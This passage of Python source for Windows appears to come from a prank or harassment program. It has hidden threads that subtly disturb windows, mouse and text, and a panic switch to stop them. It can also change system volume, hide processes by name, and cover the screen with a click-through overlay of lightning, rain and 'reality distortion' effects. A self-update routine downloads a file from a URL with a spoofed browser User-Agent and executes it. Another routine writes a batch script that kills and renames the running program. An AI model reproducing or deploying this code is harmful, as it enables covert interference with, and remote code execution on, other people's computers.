                    time.sleep(0.2)  # wait a bit
                    win32gui.ShowWindow(window, win32con.SW_SHOWMAXIMIZED)  # maximize
                    time.sleep(0.2)  # wait a bit
                    win32gui.ShowWindow(window, win32con.SW_SHOWNORMAL)  # restore to original state
                else:
                    pass
                    # print(f'Unsupported state: {current_state}')
            except Exception as e:
                   print(f"Messing with Windows Errored: {e}")
        time.sleep(5)  # wait a random amount of time


thread_subtlymesswithwindows = KThread(target=subtly_mess_with_windows)  # create the thread

def enable_subtly_mess_with_windows():
    global thread_subtlymesswithwindows
    if not thread_subtlymesswithwindows.is_alive(): # avoid duplicates
        thread_subtlymesswithwindows.start()  # start the thread
        
def disable_subtly_mess_with_windows():
    global thread_subtlymesswithwindows
    # if thread_subtlymesswithwindows.is_alive():
    thread_subtlymesswithwindows.kill()  # stop the thread
    thread_subtlymesswithwindows = KThread(target=subtly_mess_with_windows)  # create a new thread

# intermittent_internet_thread = KThread(target=intermittent_internet)

# def enable_intermittent_internet():
#     global intermittent_internet_thread
#     # avoid duplicates
#     if not intermittent_internet_thread.is_alive():
#         intermittent_internet_thread.start()  # start the thread

# def disable_intermittent_internet():
#     global intermittent_internet_thread
#     # if intermittent_internet_thread.is_alive():
#     intermittent_internet_thread.kill()  # stop the thread
#     # create a new thread
#     intermittent_internet_thread = KThread(target=intermittent_internet)  # create a new thread

def panic_subtle_functions_disable():
    disable_subtly_mess_with_mouse()
    # disable_subtly_mess_with_windows()
    disable_subtly_mess_with_text()
    dvdtimeout(0)

def enable_subtle_functions():
    enable_subtly_mess_with_mouse()
    # enable_subtly_mess_with_windows()
    enable_subtly_mess_with_text()
    dvdtimeout(300)

def set_volume(volume):
    """Sets the system volume."""
    pythoncom.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volumeInterface = cast(interface, POINTER(IAudioEndpointVolume))
    newVolume = max(0.0, min(1.0, float(volume) / 100.0))
    volumeInterface.SetMasterVolumeLevelScalar(newVolume, None)
    pythoncom.CoInitialize()

def updateselfViaLink(url):
    """Updates the script from a given URL."""
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    splitter = "ym3NY8c35NY"
    currentFilename = get_script_filename()
    extension = currentFilename.split(".")[-1]
    new_filename = f"{random_string}{splitter}{currentFilename}".split(".")[0] + "." + extension
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}, stream=True)
        print('downloading?')
        if response.status_code == 200:
            with open(new_filename, 'wb') as file:
                file.write(response.content)
            print("Downloaded new version successfully!")
        else:
            print(f"Failed to download file. Status code: {response.status_code}")
            return "failed"
    except Exception as e:
        print(f"Failed to download file: {e}")
        return "failed"
    screenoff()
    cmd = f"start cmd /k \"{os.path.join(os.getcwd(), new_filename)} update\""
    print(f'cmd: {cmd}')
    os.system(cmd)
    kill_self()

def find_file_with_string(search_string):
    """Finds a file containing a specific string in its name."""
    with os.scandir('.') as entries:
        for entry in entries:
            if entry.is_file() and search_string in entry.name:
                return True, os.path.abspath(entry)
    return False, None

def handle_update():
    """Handles the script update process."""
    splitter = "ym3NY8c35NY"
    self_filename = get_script_filename()
    if splitter in self_filename:
        oldfile = self_filename.split(splitter)[1] 
    else:
        return
    new_filename = os.path.join(get_script_directory(), oldfile).replace("\"", "").replace("\'", "") 
    try:
        runcmd(f'del {new_filename} /f')
    except Exception as e:
        print(f'Failed to delete the following file: {new_filename}')
    renameSELF(new_filename)
    handle_tostart_sequences()

def renameSELF(ToWhat):
    """Renames the script file."""
    extension = get_script_filename().split(".")[-1]
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    if "." not in ToWhat:
        ToWhat = ToWhat + "." + extension    
    if ToWhat == get_script_filename():
        return "Given name is already set to Filename"
    ToWhat_FileNameOnly = os.path.basename(ToWhat)
    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
ren "{os.path.join(get_script_directory(), get_script_filename())}" "{ToWhat_FileNameOnly}"
"{os.path.join(get_script_directory(), ToWhat)}" delFile "{os.path.join(get_script_directory(), random_string)}" ren"
    """
    screenoff()
    with open(os.path.join(get_script_directory(), random_string), "w") as cmd_file:
        cmd_file.write(cmd_content)
    runcmd("start " + os.path.join(get_script_directory(), random_string))
    kill_self()

def get_hwnds_for_pid(pid):
    """Gets a list of window handles for a given process ID."""
    def callback(hwnd, hwnds):
        """Callback function for EnumWindows."""
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True
    hwnds = []
    win32gui.EnumWindows(callback, hwnds)
    return hwnds

def set_always_on_top_via_pid(pid):
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)

    if hwnds:
        for hwnd in hwnds:
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        print(f"Set {len(hwnds)} windows to always on top for PID {pid}")
    else:
        print(f"No visible windows found for PID {pid}")

def set_always_on_top_via_name(name):
    for pid in get_pids_for_process_name(name):
        set_always_on_top_via_pid(pid)
    
def unset_always_on_top_by_pid(pid):
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)

    if hwnds:
        for hwnd in hwnds:
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, 
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        print(f"Unset always on top for {len(hwnds)} windows of PID {pid}")
    else:
        print(f"No visible windows found for PID {pid}")
        
def unset_always_on_top_by_name(name):
    """Unsets always on top for a process by its name."""
    for pid in get_pids_for_process_name(name):
        unset_always_on_top_by_pid(pid)
    
def maximize_process_via_pid(pid):
    """Maximizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
        win32gui.SetForegroundWindow(hwnd)

def get_pids_for_process_name(process_name):
    """Returns a list of PIDs for a given process name."""
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name().lower() == process_name.lower():
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return pids

def hide_process_via_name(name):
    """Hides a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        try:
            hide_process_via_pid(pid)
        except: pass
        


# Windows API constants for click-through
# (If you're on Linux/macOS, you'll need a separate approach)
GWL_EXSTYLE = -20
WS_EX_LAYERED = 0x80000
WS_EX_TRANSPARENT = 0x20

################################################################################
#   Overlay window that draws all "reality distortion" effects in one class
################################################################################
class AllEffectsOverlay(QWidget):
    """
    A single overlay widget that can display multiple "reality distortion" effects.
    Clicking an effect button calls set_effect(effect_name). "clear_effect" stops.
    Effects are more intense/bigger. Also implements click-through.
    """
    def __init__(self):
        super().__init__()

        # Configure logging
        # logging.basicConfig(level=logging.DEBUG)

        # Basic window config: no frame, always on top, tool window, translucent
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground)

        # Expand to the full screen
        screen = QApplication.primaryScreen().geometry()
        self.setGeometry(screen)

        # Make the overlay truly click-through on Windows
        self.make_click_through()

        # Timer for animations
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_overlay)
        self.timer.start(16)  # ~60 FPS

        self.current_effect = None  # Which effect is active?

        # We'll keep a general time counter for some animations
        self.effect_time = 0

        # Data structures for each effect
        self.rain_drops = []
        self.lightning_points = []
        self.lightning_alpha = 0  # for fade
        self.lightning_flash_color = None
        self.lightning_start_time = 0

        self.matrix_chars = []
        self.particles = []
        self.binary_streams = []
        self.vortex_particles = []
        self.stars = []
        self.nebulas = []
        self.psychedelic_offset = 0
        self.quantum_particles = []
        self.void_portals = []
        self.fractures = []
        self.time_ripples = []
        self.dna_strands = []
        self.tears = []
        self.energy_nodes = []
        self.energy_connections = []

        # A place to keep QSoundEffect objects
        self.sounds = {}
        
        self.init_sounds()

        # We'll track if a "tree" lightning is currently building up
        self.tree_lightning_mode = False
        self.lightning_build_triggered = False  # so we don't double-play build sizzle
        self.lightning_strike_played = False    # so we only do the big thunder once
        
        # For rain splashes
        self.rain_splashes = []

        self.init_base_data()
        self.show()

    def make_click_through(self):
        """Make this window click-through on Windows."""
        try:
            hwnd = self.winId().__int__()
            # Read current style
            styles = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
            # Add layered+transparent
            new_styles = styles | WS_EX_LAYERED | WS_EX_TRANSPARENT
            ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, new_styles)
        except Exception as e:
            print("Warning: Could not enable click-through on this OS:", e)

    def init_base_data(self):
        pass

    def init_sounds(self):
        """Preload sound effects for each effect."""
        # Example: a continuous rain loop
        self.sounds['rain'] = QSoundEffect(self)
        self.sounds['rain'].setSource(QUrl.fromLocalFile("path/to/rain_loop.wav"))
        self.sounds['rain'].setLoopCount(QSoundEffect.Infinite)  # loop forever
        self.sounds['rain'].setVolume(0.8)

        # A short splash sound
        self.sounds['rain_splash'] = QSoundEffect(self)
        self.sounds['rain_splash'].setSource(QUrl.fromLocalFile("path/to/splash.wav"))
        self.sounds['rain_splash'].setLoopCount(1)
        self.sounds['rain_splash'].setVolume(0.8)

        # Lightning build-up sizzling
        self.sounds['lightning_build'] = QSoundEffect(self)
        self.sounds['lightning_build'].setSource(QUrl.fromLocalFile("path/to/lightning_build.wav"))
        self.sounds['lightning_build'].setLoopCount(1)
        self.sounds['lightning_build'].setVolume(1.0)

        # Lightning strike thunder
        self.sounds['lightning_strike'] = QSoundEffect(self)
        self.sounds['lightning_strike'].setSource(QUrl.fromLocalFile("path/to/lightning_strike.wav"))
        self.sounds['lightning_strike'].setLoopCount(1)
        self.sounds['lightning_strike'].setVolume(1.0)

        # Example placeholders for other effects
        self.sounds['matrix'] = QSoundEffect(self)
        self.sounds['matrix'].setSource(QUrl.fromLocalFile("path/to/matrix_drip.wav"))
        self.sounds['matrix'].setLoopCount(QSoundEffect.Infinite)
        self.sounds['matrix'].setVolume(0.5)

    # -------------------------------------------------------------------------
    #   SET & CLEAR EFFECTS
    # -------------------------------------------------------------------------
    def set_effect(self, effect_name):
        # Stop currently playing sound if any
        if self.current_effect and self.current_effect in self.sounds:
            self.sounds[self.current_effect].stop()

        self.current_effect = effect_name
        print(f"[AllEffectsOverlay] Activating effect: {effect_name}")
        self.init_effect_data(effect_name)

        # If there's a dedicated sound for this effect, play it
        if effect_name in self.sounds:
            self.sounds[effect_name].play()

    def clear_effect(self):
        print("[AllEffectsOverlay] Clearing effect.")
        # Stop the current effect's sound if any
        if self.current_effect and self.current_effect in self.sounds:
            self.sounds[self.current_effect].stop()
        self.current_effect = None

    def init_effect_data(self, effect_name):
        if effect_name == "rain":
            self.init_rain()
        elif effect_name == "lightning":
            self.init_lightning()
        elif effect_name == "matrix":
            self.init_matrix()
        elif effect_name == "particles":
            self.init_particles()
        elif effect_name == "binary":
            self.init_binary()
        elif effect_name == "vortex":
            self.init_vortex()
        elif effect_name == "cosmic":
            self.init_cosmic()
        elif effect_name == "psychedelic":
            self.psychedelic_offset = 0
        elif effect_name == "quantum_particles":
            self.init_quantum_particles()
        elif effect_name == "void_portals":
            self.init_void_portals()
        elif effect_name == "reality_fractures":
            self.init_reality_fractures()
        elif effect_name == "time_ripples":
            self.init_time_ripples()
        elif effect_name == "dna_helix":
            self.init_dna_helix()
        elif effect_name == "dimensional_tears":
            self.init_dimensional_tears()
        elif effect_name == "energy":
            self.init_energy_field()

    # -------------------------------------------------------------------------
    #   DATA INITIALIZERS
    # -------------------------------------------------------------------------
    def init_rain(self):
        self.rain_drops.clear()
        self.rain_splashes.clear()  # Clear existing splashes
        sw = self.width()
        sh = self.height()
        # More intense => more raindrops
        for _ in range(300):
            self.rain_drops.append({
                'x': random.randint(0, sw),
                'y': random.randint(-sh, 0),
                'speed': random.randint(6, 13)
            })

    def init_lightning(self):
        self.lightning_points.clear()
        self.lightning_tree_segments = []
        self.lightning_alpha = 255
        self.lightning_flash_color = None
        self.lightning_start_time = time.time()

        # Random color for the flash
        flash_colors = [
            QColor(255, 255, 255),
            QColor(255, 0, 255),
            QColor(150, 0, 255),
            QColor(255, 255, 0),
        ]
        self.lightning_flash_color = random.choice(flash_colors)

        # 60% chance for branching “tree” lightning
        if random.random() < 0.6:
            self.tree_lightning_mode = True
            self.lightning_build_triggered = False
            self.lightning_strike_played = False
            self.init_tree_lightning()
        else:
            # Normal single bolt
            self.tree_lightning_mode = False
            x = random.randint(0, self.width())
            y = 0
            self.lightning_points.append((x, y))
            while y < self.height():
                y += random.randint(20, 50)
                x += random.randint(-60, 60)
                # Clamp x to screen bounds
                x = max(0, min(self.width(), x))
                self.lightning_points.append((x, y))
            # Play immediate strike sound
            if 'lightning_strike' in self.sounds:
                self.sounds['lightning_strike'].play()

    def generate_fractal_lightning(self, x, y, angle, depth, length, spread):
        """
        Recursively generate lightning segments using fractal branching with physics influence.
        """
        if depth == 0 or length < 5:
            return

        # Calculate end point
        end_x = x + length * math.cos(angle)
        end_y = y + length * math.sin(angle)

        # Clamp to screen bounds
        end_x = max(0, min(self.width(), end_x))
        end_y = max(0, min(self.height(), end_y))

        # Add segment
        self.lightning_tree_segments.append((x, y, end_x, end_y))

        # Reduce length for sub-branches
        new_length = length * random.uniform(0.6, 0.8)
        new_depth = depth - 1

        # Probability decreases with depth to simulate resistance
        branch_probability = 0.3 / (depth + 1)

        # Number of sub-branches based on probability
        if random.random() < branch_probability:
            num_branches = random.randint(1, 2)
            for _ in range(num_branches):
                # Random angle deviation influenced by electric field
                bias = self.electric_field(end_x, end_y)
                deviation = random.uniform(-spread, spread) + bias * 10  # Adjust bias multiplier as needed
                new_angle = angle + math.radians(deviation)

                # Recursively generate sub-branches
                self.generate_fractal_lightning(end_x, end_y, new_angle, new_depth, new_length, spread / 1.5)

    def init_tree_lightning(self):
        start_x = random.randint(int(0.1 * self.width()), int(0.9 * self.width()))  # Avoid edges
        start_y = 0  # Start from the top
        initial_angle = math.pi / 2  # Straight down
        initial_length = 80  # Initial segment length
        max_depth = 6  # Controls the complexity

        self.lightning_tree_segments = []

        # Start recursive fractal generation
        self.generate_fractal_lightning(start_x, start_y, initial_angle, max_depth, initial_length, 30)

        # Ensure at least one segment reaches the bottom
        if self.lightning_tree_segments:
            last_seg = self.lightning_tree_segments[-1]
            _, _, last_x, last_y = last_seg
            if last_y < self.height():
                final_seg = (last_x, last_y, last_x, self.height())
                self.lightning_tree_segments.append(final_seg)

        # logging.debug(f"Initialized fractal tree lightning with {len(self.lightning_tree_segments)} segments.")

        # Play build sound if in tree mode
        if self.tree_lightning_mode:
            if 'lightning_build' in self.sounds:
                self.sounds['lightning_build'].play()

    def electric_field(self, x, y):
        """
        Simulate a simple electric field that influences the horizontal direction.
        Returns a bias value between -1 and 1.
        """
        # Radial electric field centered at screen center
        center_x = self.width() / 2
        center_y = self.height() / 2
        dx = x - center_x
        dy = y - center_y
        distance = math.hypot(dx, dy) + 1e-5  # Avoid division by zero
        # Invert influence as we descend (stronger at top)
        bias = (dx / distance) * (self.height() - y) / self.height()
        return bias



    def init_matrix(self):
        self.matrix_chars.clear()
        columns = self.width() // 20
        for x in range(columns):
            self.matrix_chars.append({
                'x': x * 20,
                'y': random.randint(-500, 0),
                'speed': random.uniform(4, 10),
                'length': random.randint(5, 15),
                'chars': [chr(random.randint(0x30A0, 0x30FF)) for _ in range(30)]
            })

    def init_particles(self):
        self.particles.clear()
        for _ in range(300):  # More intense
            self.particles.append({
                'x': random.randint(0, self.width()),
                'y': random.randint(0, self.height()),
                'dx': random.uniform(-4, 4),
                'dy': random.uniform(-4, 4),
                'size': random.randint(3, 7),
                'color': QColor(
                    random.randint(100, 255),
                    random.randint(100, 255),
                    random.randint(100, 255),
                    150
                )
            })

    def init_binary(self):
        self.binary_streams.clear()
        columns = self.width() // 15
        for x in range(columns):
            self.binary_streams.append({
                'x': x * 15,
                'y': random.randint(-500, 0),
                'speed': random.uniform(3, 7),
                'length': random.randint(10, 40),
            })

    def init_vortex(self):
        self.vortex_particles.clear()
        for _ in range(1000):
            angle = random.uniform(0, 2 * math.pi)
            radius = random.uniform(50, max(self.width(), self.height()))
            self.vortex_particles.append({
                'angle': angle,
                'radius': radius,
                'speed': random.uniform(0.01, 0.03),
                'size': random.uniform(1, 5),
                'color': self.get_rainbow_color(random.random())
            })

    def init_cosmic(self):
        self.stars.clear()
        self.nebulas.clear()
        for _ in range(500):
            self.stars.append({
                'x': random.randint(0, self.width()),
                'y': random.randint(0, self.height()),
                'size': random.uniform(1, 3),
                'twinkle_speed': random.uniform(0.02, 0.1),
                'phase': random.random() * 2 * math.pi
            })
        for _ in range(8):
            self.nebulas.append({
                'x': random.randint(0, self.width()),
                'y': random.randint(0, self.height()),
                'size': random.randint(200, 500),
                'color': QColor(random.randint(50, 200),
                                random.randint(50, 200),
                                random.randint(50, 200), 120),
                'alpha': random.uniform(0.3, 0.6)
            })

    def init_quantum_particles(self):
        self.quantum_particles.clear()
        for _ in range(50):
            self.quantum_particles.append({
                'pos': QPointF(random.randint(0, self.width()),
                               random.randint(0, self.height())),
                'wave_phase': random.uniform(0, 2 * math.pi),
                'frequency': random.uniform(0.01, 0.06),
                'amplitude': random.uniform(30, 60),
                'uncertainty': random.uniform(15, 30),
                'color': self.get_rainbow_color(random.random()),
                'entangled_partner': None
            })
        # Pair them
        for i in range(0, len(self.quantum_particles), 2):
            if i + 1 < len(self.quantum_particles):
                self.quantum_particles[i]['entangled_partner'] = self.quantum_particles[i + 1]
                self.quantum_particles[i + 1]['entangled_partner'] = self.quantum_particles[i]

    def init_void_portals(self):
        self.void_portals.clear()
        for _ in range(3):
            portal = {
                'center': QPointF(random.randint(150, self.width() - 150),
                                  random.randint(150, self.height() - 150)),
                'radius': random.uniform(80, 200),
                'rotation': 0,
                'spin_speed': random.uniform(0.02, 0.05),
                'particles': [],
                'distortion': random.uniform(1.1, 2.0)
            }
            for _ in range(80):
                angle = random.uniform(0, 2 * math.pi)
                distance = random.uniform(0, portal['radius'])
                portal['particles'].append({
                    'angle': angle,
                    'distance': distance,
                    'speed': random.uniform(0.01, 0.04),
                    'size': random.uniform(1, 4)
                })
            self.void_portals.append(portal)

    def init_reality_fractures(self):
        self.fractures.clear()
        for _ in range(5):
            f_points = []
            x = random.randint(0, self.width())
            y = random.randint(0, self.height())
            for _ in range(random.randint(7, 12)):
                x += random.randint(-100, 100)
                y += random.randint(-100, 100)
                f_points.append(QPointF(x, y))
            frac = {
                'points': f_points,
                'width': random.uniform(3, 6),
                'glow_intensity': random.uniform(0.5, 1.0),
                'color': QColor(random.randint(150, 255),
                                random.randint(0, 150),
                                random.randint(100, 255))
            }
            self.fractures.append(frac)

    def init_time_ripples(self):
        self.time_ripples.clear()

    def init_dna_helix(self):
        self.dna_strands.clear()
        nucle_colors = {
            'A': QColor(0, 0, 255),
            'T': QColor(255, 140, 0),
            'G': QColor(0, 255, 0),
            'C': QColor(255, 255, 0),
        }
        # We'll do 40 base points
        for strand_i in range(2):
            dna_points = []
            for i in range(40):
                nuc = random.choice(['A', 'T', 'G', 'C'])
                dna_points.append({
                    'base_y': i * 20,
                    'phase': i * 0.25 + strand_i * math.pi,
                    'nucleotide': nuc,
                    'color': nucle_colors[nuc]
                })
            self.dna_strands.append(dna_points)

    def init_dimensional_tears(self):
        self.tears.clear()
        for _ in range(4):
            dt_points = [QPointF(random.randint(0, self.width()),
                                 random.randint(0, self.height()))]
            dt = {
                'start': dt_points[0],
                'points': dt_points,
                'growth_direction': QPointF(random.uniform(-1, 1),
                                            random.uniform(-1, 1)),
                'width': random.uniform(6, 12),
                'color': QColor(random.randint(100, 255),
                                random.randint(100, 255),
                                random.randint(100, 255))
            }
            # Make it multiple segments
            current = dt_points[0]
            for _ in range(random.randint(5, 10)):
                angle = math.atan2(dt['growth_direction'].y(), dt['growth_direction'].x())
                angle += random.uniform(-0.7, 0.7)
                length = random.uniform(30, 60)
                cx = current.x() + math.cos(angle) * length
                cy = current.y() + math.sin(angle) * length
                nxt = QPointF(cx, cy)
                dt['points'].append(nxt)
                current = nxt
            self.tears.append(dt)

    def init_energy_field(self):
        self.energy_nodes.clear()
        self.energy_connections.clear()
        for _ in range(30):
            node = {
                'pos': QPointF(random.randint(0, self.width()),
                               random.randint(0, self.height())),
                'velocity': QPointF(random.uniform(-3, 3),
                                    random.uniform(-3, 3)),
                'charge': random.choice([-1, 1]),
                'energy': random.uniform(0.5, 1.0),
                'connections': set()
            }
            self.energy_nodes.append(node)

    # -------------------------------------------------------------------------
    #   UPDATE (CALLED PER FRAME)
    # -------------------------------------------------------------------------
    def update_overlay(self):
        self.effect_time += 1  # increment time step each frame

        if self.current_effect == "rain":
            self.update_rain()
        elif self.current_effect == "lightning":
            self.update_lightning()
        elif self.current_effect == "matrix":
            self.update_matrix_logic()
        elif self.current_effect == "particles":
            self.update_particles_logic()
        elif self.current_effect == "binary":
            self.update_binary_logic()
        elif self.current_effect == "vortex":
            self.update_vortex_logic()
        elif self.current_effect == "cosmic":
            self.update_cosmic_logic()
        elif self.current_effect == "psychedelic":
            self.update_psychedelic_logic()
        elif self.current_effect == "quantum_particles":
            self.update_quantum_particles_logic()
        elif self.current_effect == "void_portals":
            self.update_void_portals_logic()
        elif self.current_effect == "reality_fractures":
            pass
        elif self.current_effect == "time_ripples":
            self.update_time_ripples_logic()
        elif self.current_effect == "dna_helix":
            self.update_dna_helix_logic()
        elif self.current_effect == "dimensional_tears":
            pass
        elif self.current_effect == "energy":
            self.update_energy_field_logic()

        # If time_ripples is active, spawn occasionally
        if self.current_effect == "time_ripples":
            if random.random() < 0.02:
                self.add_time_ripple(QPointF(random.randint(0, self.width()),
                                             random.randint(0, self.height())))

        self.update()

    # ~~~~~ Effect-specific update logic ~~~~~
    def update_rain(self):
        sw = self.width()
        sh = self.height()
        wind_strength = 0.1  # Adjust wind strength as needed

        for drop in self.rain_drops:
            # Apply gravity
            drop['speed'] += 0.1  # Gravity acceleration

            # Apply wind
            drop['x'] += wind_strength  # Constant wind; for more realism, make it vary

            drop['y'] += drop['speed']

            # If it goes beyond bottom, reset it to top and create a splash
            if drop['y'] > sh:
                # Make a splash at bottom
                self.create_splash(drop['x'], sh)
                # Respawn the drop
                drop['y'] = random.randint(-50, 0)
                drop['x'] = random.randint(0, sw)
                drop['speed'] = random.randint(6, 13)

        # Update splashes
        self.update_rain_splashes()

        
    def create_splash(self, x, y):
        # Probability factor if you want fewer splashes
        if random.random() < 0.33:
            # Add new splash
            self.rain_splashes.append({
                'x': x,
                'y': y,
                'radius': 0,
                'max_radius': random.randint(10, 30),
                'alpha': 255
            })
            # Optionally play a splash sound
            if 'rain_splash' in self.sounds:
                self.sounds['rain_splash'].play()

    def update_rain_splashes(self):
        # Expand and fade out
        for splash in self.rain_splashes:
            splash['radius'] += 1.5
            # fade out
            splash['alpha'] -= 8
        # Remove finished
        self.rain_splashes = [s for s in self.rain_splashes if s['alpha'] > 0]


    
    def update_lightning(self):
        now = time.time()
        elapsed = now - self.lightning_start_time

        if self.tree_lightning_mode:
            # Play sizzling sound if not already triggered
            if not self.lightning_build_triggered:
                if 'lightning_build' in self.sounds:
                    self.sounds['lightning_build'].play()
                self.lightning_build_triggered = True

            if elapsed < 1.3:
                fraction = elapsed / 1.3
                total = len(self.lightning_tree_segments)
                if total > 0:
                    self.num_revealed_segments = int(total * fraction)
                    # Clamp to total segments
                    self.num_revealed_segments = min(self.num_revealed_segments, total)
                    # logging.debug(f"Revealed segments: {self.num_revealed_segments}/{total}")
                else:
                    self.num_revealed_segments = 0
                    # logging.warning("No segments available in lightning_tree_segments during build-up.")
            else:
                # All segments revealed
                self.num_revealed_segments = len(self.lightning_tree_segments)
                # logging.debug(f"All segments revealed: {self.num_revealed_segments}/{len(self.lightning_tree_segments)}")

                if not self.lightning_strike_played:
                    if 'lightning_strike' in self.sounds:
                        self.sounds['lightning_strike'].play()
                    self.lightning_strike_played = True

                # Check if any segment reaches the bottom
                reaches_bottom = any(seg[3] >= self.height() for seg in self.lightning_tree_segments[:self.num_revealed_segments])
                if reaches_bottom:
                    # Identify the first segment that reaches the bottom
                    for idx, seg in enumerate(self.lightning_tree_segments[:self.num_revealed_segments]):
                        if seg[3] >= self.height():
                            # Keep only this segment
                            self.lightning_tree_segments = [seg]
                            self.num_revealed_segments = 1
                            # Start fading
                            self.lightning_alpha = 255
                            # logging.debug(f"Segment {idx} reached the bottom. Initiating fade-out.")
                            break

                # Fade out
                if self.num_revealed_segments == 1:
                    self.lightning_alpha -= 7  # Adjust fade speed as needed
                    # logging.debug(f"Fading lightning: alpha={self.lightning_alpha}")
                    if self.lightning_alpha < 0:
                        # Done
                        self.lightning_alpha = 0
                        self.lightning_tree_segments.clear()
                        # logging.info("Lightning tree segments cleared after fade-out.")
        else:
            # Normal single bolt logic
            if elapsed < 0.3:
                pass  # Initial flash phase
            else:
                self.lightning_alpha -= 7
                if self.lightning_alpha < 0:
                    self.lightning_alpha = 0
                    self.lightning_points.clear()

    





    def update_matrix_logic(self):
        for stream in self.matrix_chars:
            stream['y'] += stream['speed']
            if stream['y'] > self.height() + 500:
                stream['y'] = random.randint(-500, 0)

    def update_particles_logic(self):
        for p in self.particles:
            p['x'] += p['dx']
            p['y'] += p['dy']
            if p['x'] < 0 or p['x'] > self.width():
                p['dx'] *= -1
            if p['y'] < 0 or p['y'] > self.height():
                p['dy'] *= -1

    def update_binary_logic(self):
        for s in self.binary_streams:
            s['y'] += s['speed']
            if s['y'] > self.height() + 200:
                s['y'] = random.randint(-500, 0)

    def update_vortex_logic(self):
        for v in self.vortex_particles:
            # Update angle based on speed and current radius
            v['angle'] += v['speed'] * (v['radius'] / 100)

            # Apply centrifugal force: particles move outward
            v['radius'] += 0.5  # Adjust outward speed as needed

            # Reset if particles move too far
            if v['radius'] > max(self.width(), self.height()):
                v['radius'] = 10  # Reset to near center
                v['angle'] = random.uniform(0, 2 * math.pi)


    def update_cosmic_logic(self):
        # We can have each star twinkle with effect_time
        for s in self.stars:
            s['phase'] += s['twinkle_speed']

    def update_psychedelic_logic(self):
        self.psychedelic_offset += 0.1

    def update_quantum_particles_logic(self):
        for p in self.quantum_particles:
            p['wave_phase'] += p['frequency']
            dx = random.gauss(0, p['uncertainty'])
            dy = random.gauss(0, p['uncertainty'])
            newx = p['pos'].x() + dx
            newy = p['pos'].y() + dy
            newx = max(0, min(self.width(), newx))
            newy = max(0, min(self.height(), newy))
            p['pos'].setX(newx)
            p['pos'].setY(newy)
            if p['entangled_partner']:
                p['entangled_partner']['wave_phase'] = -p['wave_phase']

    def update_void_portals_logic(self):
        for portal in self.void_portals:
            portal['rotation'] += portal['spin_speed']
            for pt in portal['particles']:
                pt['angle'] += pt['speed']
                if pt['distance'] > 2:
                    pt['distance'] *= 0.99

    def update_time_ripples_logic(self):
        for r in self.time_ripples:
            r['radius'] += r['speed']
            r['alpha'] = int(max(0, 255 * (1 - r['radius'] / r['max_radius'])))
        self.time_ripples = [r for r in self.time_ripples if r['alpha'] > 0]

    def add_time_ripple(self, pos):
        ripple = {
            'center': pos,
            'radius': 0,
            'max_radius': random.uniform(100, 250),
            'speed': random.uniform(2, 5),
            'alpha': 255
        }
        self.time_ripples.append(ripple)

    def update_dna_helix_logic(self):
        for strand in self.dna_strands:
            for point in strand:
                point['phase'] += 0.03

    def update_energy_field_logic(self):
        for node in self.energy_nodes:
            node['pos'] += node['velocity']
            if node['pos'].x() < 0 or node['pos'].x() > self.width():
                node['velocity'].setX(-node['velocity'].x())
            if node['pos'].y() < 0 or node['pos'].y() > self.height():
                node['velocity'].setY(-node['velocity'].y())
            node['connections'].clear()
        self.energy_connections.clear()
        n = len(self.energy_nodes)
        for i in range(n):
            for j in range(i + 1, n):
                n1 = self.energy_nodes[i]
                n2 = self.energy_nodes[j]
                dx = n1['pos'].x() - n2['pos'].x()
                dy = n1['pos'].y() - n2['pos'].y()
                dist = math.hypot(dx, dy)
                if dist < 250:
                    strength = 1 - (dist / 250)
                    if n1['charge'] == n2['charge']:
                        strength *= 0.5
                    if strength > 0.1:
                        self.energy_connections.append({
                            'node1': n1,
                            'node2': n2,
                            'strength': strength
                        })
                        n1['connections'].add(j)
                        n2['connections'].add(i)

    # -------------------------------------------------------------------------
    #   PAINT EVENT
    # -------------------------------------------------------------------------
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)

        # If there's a lightning flash
        if self.current_effect == "lightning":
            now = time.time()
            if (now - self.lightning_start_time) < 0.3:
                # Fill screen with flash color
                if self.lightning_flash_color:
                    painter.fillRect(self.rect(), self.lightning_flash_color)

        # Draw whichever effect
        if self.current_effect == "rain":
